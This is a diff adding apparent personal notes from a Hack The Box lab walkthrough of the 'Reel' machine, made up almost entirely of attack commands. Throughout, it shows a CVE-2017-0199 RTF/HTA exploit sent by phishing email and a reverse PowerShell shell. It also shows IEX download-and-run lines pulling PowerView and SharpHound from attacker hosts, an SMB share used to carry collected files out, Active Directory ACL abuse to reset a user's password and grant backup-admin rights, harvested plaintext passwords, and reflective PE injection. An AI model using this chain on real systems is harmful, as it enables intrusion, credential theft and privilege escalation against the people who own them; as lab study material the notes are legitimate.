@@ -1,0 +1,130 @@
+* CVE-2017-0199 exploit
+    python cve-2017-0199_toolkit.py -w jasondidit.rtf -u http://10.10.13.96/jasondidit.hta -t RTF -M gen
+* Create hta file use powershell
+    cat /opt/nishang/Out-HTA.ps1 | xclip -selection primary
+    From powershell 
+        Out-HTA -PayloadURL http://10.10.13.96/jasondidit.ps1
+* Create Payload    
+    cd /opt/nishang/Shells
+    cp Invoke-PowerShellTcp.ps1 /root/htb/boxes/reel/www/jasondidit.ps1
+    - modify this file( add one line ''Invoke-PowershellTcp -Reverse -Address -Port' )
+* Use CVE-2017-0199 exploit and send Email which is attached with jasondidit.rtf
+    sendemail -f jason@megabank.com -t nico@megabank.com -u RTF -m "Jason did it" -a jasondidit.rtf -s 10.10.10.77
+    then, you get a reverse shell
+    
+* Post exploitation
+    - check users list
+        cd C:\users\nico\Desktop
+    - find a suspicious file cred.xml
+        type cred.xml
+        then, you find key word 'UserName' and 'Password', you may potentiallly create a credential with it
+        $pass = "..." | convertto-securestring
+        $user = "..."
+    - create a credential 
+        $cred = New-Object System.Managemet.Automation.PSCredential($user, $pass)
+        $cred.GetNetworkCredential() | fl
+        Congratulations,you get a credential 
+    - BloodHound exploit 
+        - download BloodHound.ps1 through reverse powershell
+            IEX(New-Object Net.WebClient).downloadString('http://10.10.13.96/SharpHound.ps1')
+            Invoke-BloodHound -CollectionMethod All
+        - transport the generated file to your machine
+            - start smbserver in your machine 
+                impacket-smbserver share 'pwd' (use port 445 netstat -alnp | grep 445)
+            - start share smb client from revser pwsh
+                net use {drive name}: \\10.10.13.96\share
+            - upload file like normal
+                cp *.zip {drive name}:
+        - get domain groups exiting in target machine 
+            net groups /domain
+            now you find a BACKUP_ADMINS group name, that is very important cause backup_admin
+        have the r/w access to any file ( AD Security Object )
+        - fake other user domain and redo the bloodhound
+            IEX(New-Object Net.WebClient).downloadString('http://10.10.15.170/PowerView.ps1')
+            IEX(New-Object Net.WebClient).downloadString('http://10.10.15.170/SharpHound.ps1')
+            
+            Then, gain full access to Herman user and escalate priority
+            Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
+            Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
+            Invoke-BloodHound -CollectionMethod All( Check if successed  )
+
+            Create a new password and change herman's password
+            $pass = ConvertTo-SecureString 'PleaseSubscribe!' -AsPlainText -Force
+            Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
+            
+            Get the member group of target
+            Get-DomainGroup -MemberIdentity Herman | select samaccountname
+
+            Add the user Herman to Backup_Admins group
+            $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
+            Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
+            
+            Conclusion:
+            IEX(New-Object Net.WebClient).downloadString('http://10.10.13.80/PowerView.ps1')
+            Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
+            Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
+            $pass = ConvertTo-SecureString 'PleaseSubscribe!' -AsPlainText -Force
+            Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
+            $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
+            Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
+            Get-DomainGroup -MemberIdentity Herman | select samaccountname
+
+        - ssh Herman user with custom password 
+        ssh herman@10.10.10.77
+        - then enter into administrator desktop and check it!
+        cd C:\users\administrator\desktop
+        type * | findstr password
+        - then you get the password: admin password 'Cr4ckMeIfYouC4n!'
+
+        -Read files in current folder to get password
+        type * | findstr password
+
+- Bonus 
+    - Check which version .net target machine is running
+        cd C:\windows\Microsoft.net\Framework64
+        dir
+        cd v4.0.30319
+        Get-Item clr.dll | fl ( get target machine .net framework version -- check fileversion keyword )
+        - then, google it and you will find that target machine uses dotnet version: .net framework 4.5.1, and you 
+        should build watson using .net framework 4.5 in visual studio 2017
+        - build watson project and you will get a watson.exe
+
+        - Check if 64 bit arch
+        [Environment]::Is64BitOperatingSystem
+        [Environment]::Is64BitPorcess
+        
+        - Load PE executable file and execute PE bytes on target machine( failed )
+        IEX(New-Object Net.WebClient).downloadString('http://10.10.13.80/pe.ps1')
+        $PEBytes = [IO.File]::ReadAllBytes('Watson.exe')
+        Invoke-ReflectivePEInjection -PEBytes $PEBytes
+        - Try loading dll file
+        [Reflection.Assembly]::LoadFile("watson.dll")
+        [Watson.Program]::Main()
+        - Tip: if failed, Rebuild Watson project and get dll
+
+        - msfconsole
+            use exploit/windows/fileformat/office_word_hta
+            show options
+            set RHOST 10.10.10.77
+            set SRVHOST 10.10.13.80
+            set LHOST 10.10.13.80
+            sendemail -f jason@megabank.com -t nico@megabank.com -u RTF -m "blah blah blah"  
+            -a {generated doc file}
+            Get reverse shell
+            - post exploitation
+            use exploit/windows/local/alpc_taskscheduler
+        
+- Don't know what to work for
+grep -Ri Invoke-ReflectivePE /opt/PowerSploit-dev/
+        
+- Trick
+Check windows last update and last patch
+    cd C:\windows
+    type WindowsUpdate.log | findstr KB
+    
+
+    
+
+
+
+    
